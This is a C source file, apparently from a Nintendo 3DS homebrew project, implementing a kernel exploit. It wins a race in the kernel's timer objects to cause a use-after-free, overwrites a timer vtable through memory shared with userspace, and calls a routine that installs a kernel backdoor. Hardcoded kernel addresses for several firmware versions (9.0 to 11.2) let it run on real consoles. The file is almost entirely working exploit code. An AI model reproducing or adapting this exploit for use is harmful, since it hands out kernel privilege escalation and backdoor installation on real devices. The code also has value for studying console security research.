/* Exploit-related code. Ned Williamson 2016 */
#include <3ds.h>
#include <stdio.h>
#include "backdoor.h"
#include "exploit.h"
#include "timer.h"
#include "util.h"

extern void *handle_lookup_kern;
extern void *RandomStub;
extern u32 *svc_handler_table_writable;

#define TIMER2_NEXT_KERNEL 0xe281100c

static u32 fptrs[16] = {
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
  (u32)&install_kernel_backdoor,
};

#define LINEAR_KERN_TO_USER(addr) ((addr) - 0xE0000000 + 0x14000000)

static bool check_control() {
  Handle timer, timer2;
  Result res;

  vu32 *timer2_next_user = (u32 *)LINEAR_KERN_TO_USER(TIMER2_NEXT_KERNEL);

  u32 orig_value = *timer2_next_user;

  res = svcCreateTimer(&timer, PULSE_EVENT);
  if (res < 0) {
    printf("check_control: couldn't create timer1\n");
    return false;
  }

  res = svcCreateTimer(&timer2, PULSE_EVENT);
  if (res < 0) {
    printf("check_control: couldn't create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u32 current_value = *timer2_next_user;

  /* if nothing changed, then we didn't win the race */
  if (orig_value == current_value) {
    res = svcCloseHandle(timer2);
    if (res < 0) {
      printf("check_control: warning: couldn't destroy timer2\n");
    }

    res = svcCloseHandle(timer);
    if (res < 0) {
      printf("check_control: warning: couldn't destroy timer\n");
    }

    return false;
  }

  printf("we won!\n");
  wait_for_user();

  /* we won the race! replace vtable with our own */
  *timer2_next_user = (u32)&fptrs;

  /* this installs the backdoor */
  svcCancelTimer(timer2);

  /* put vtable back so we can free normally */
  *timer2_next_user = current_value;

  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("check_control: warning: couldn't destroy timer2\n");
  }

  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("check_control: warning: couldn't destroy timer\n");
  }

  /* put original vtable back */
  printf("backdoor_installed: %d\n", backdoor_installed);
  wait_for_user();

  if (!backdoor_installed) {
    return false;
  }

  /* TODO restore timer free pointers in here */

  return true;
}

bool initialize_timer_state() {
  Result res;
  Handle timer;

  /* alloced: timer1 */
  res = svcCreateTimer(&timer, 0);
  if (res < 0) {
    printf("failed to create timer1\n");
    return false;
  }

  /* alloced: timer1, timer2 */
  Handle timer2;
  res = svcCreateTimer(&timer2, 2);
  if (res < 0) {
    printf("failed to create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u64 timeout = 0x100000000 | (u32)RandomStub;
  timeout /= 3;
  svcCancelTimer(timer2);

  if (!set_timer(timer2, 0xaaa00000, 0)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  // goal: 0xFFF1B65C
  if (!set_timer(timer2, (u32)timeout, (u32)RandomStub - ((u32)timeout)*3)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  //return false;
  
  if (mybackdoor_installed()) {
    u64 initial = 0;
    if (!get_timer_value(timer2, &initial, NULL)) {
      printf("set_timer_test: get_timer_value failed\n");
      svcCloseHandle(timer2);
      svcCloseHandle(timer);
      return false;
    }

    u32 target = (u32)((initial) >> 32);
    if (target != (u32)(void*)handle_lookup_kern) {
      printf("warning: got bad target: %lx\n", target);
    } else {
      printf("got good target!\n");
    }
    wait_for_user();
  }

  /* alloced: timer1 */
  /* freed: timer2 -> ... */
  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }

  /* freed: timer1 -> timer2 -> ... */
  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }
  return true;
}

/* returns true if attempt succeeded */
/* call this after initialize_state */
bool try_once() {
  Handle timer;
  /* each round, we allocate timer1, run the pulse timer,
   * then free it. if it frees while pulsing a UAF occurs
   * and we have &timer2 where &timer1->vtable should be.
   * so we get a vtable call where the fields from timer2
   * were controlled
   *
   * then we get (timer2+0x3c)(timer2, ...)
   * so return to any kernel function that writes an error to R0
   * 0xE....... which is R/W shared with userspace 0x2.......
   * this gives us *timer2 = userspace_addr;
   * and the timer object free list is timer1 -> timer2 -> ...
   * so we need to alloc two times to get timer2, then we should
   * be able to overwrite its vtable as we please using the shared
   * memory
   */

  svcCreateTimer(&timer, PULSE_EVENT);
  // set timer with a quick first pulse, long second pulse
  // 6000 found using random trial and error. there might be
  // a better value
  svcSetTimer(timer, 8000, 0x1000000000);
  // hope the pulse race happens
  svcCloseHandle(timer);
  svcSleepThread(1000000);

  /* reallocate the freed timer and clear it from the scheduler */
  svcCreateTimer(&timer, PULSE_EVENT);
  svcCancelTimer(timer);
  svcCloseHandle(timer);

  // printf("after race attempt (backdoored)\n");
  // print_array_wait("timer1", timer1_addr, 8);
  // print_array_wait("timer2", timer2_addr, 8);

  /* free list: timer1_addr -> timer2_addr -> user_vtable -> ... */

  return check_control();
}

typedef struct version_table {
  u32 kver;
  u32 handle_lookup;
  u32 random_stub;
  u32 svc_handler_table;
} version_table;

// New 3DS
static version_table n_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF18D5C, 0xFFF1B1A4, 0xFFF02300},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF18AFC, 0xFFF1B188, 0xFFF02310},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF18AF0, 0xFFF1B17C, 0xFFF0230C},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF18B18, 0xFFF1B1A4, 0xFFF02308},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF18AF0, 0xFFF1B17C, 0xFFF02310},  // 10.2
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18CD4, 0xFFF1B5FC, 0xFFF0230C},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18CD4, 0xFFF1B63C, 0xFFF0230C},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18CF4, 0xFFF1B65C, 0xFFF0230C},  // 11.2
  {0},
};

// Old 3DS
static version_table o_table[] = {
  {SYSTEM_VERSION(2, 52, 0),  0xfff18aa0, 0xfff1b30c, 0xfff02328},  // 11.2
  {0},
};

bool initialize_handle_address() {
  u32 kver = osGetKernelVersion();
  bool n3ds = false;
  APT_CheckNew3DS(&n3ds);

  version_table *table = n3ds ? n_table : o_table;
  while (table->kver) {
    if (table->kver == kver) {
      handle_lookup_kern = (void*)table->handle_lookup;
      RandomStub = (void*)table->random_stub;
      u32 svc_handler_table_pa = table->svc_handler_table - 0xfff00000 + 0x1ff80000;
      svc_handler_table_writable = (u32*)(svc_handler_table_pa - 0x1ff00000 + 0xdff00000);
      return true;
    }
    table = table + 1;
  }
  return false;
}
bool k11_exploit() {
  if (!initialize_handle_address()) {
    printf("k11_exploit: unsupport kernel version\n");
    return false;
  }

  if (!initialize_timer_state()) {
    printf("k11_exploit: couldn't initialize timer state\n");
    return false;
  }

  for (int i = 0; i < 0x1000; i++) {
    if ((i % 0x100) == 0) {
      printf("beginning attempt 0x%x\n", i);
    }
    if (try_once()) {
      return true;
    }
  }
  return false;
}
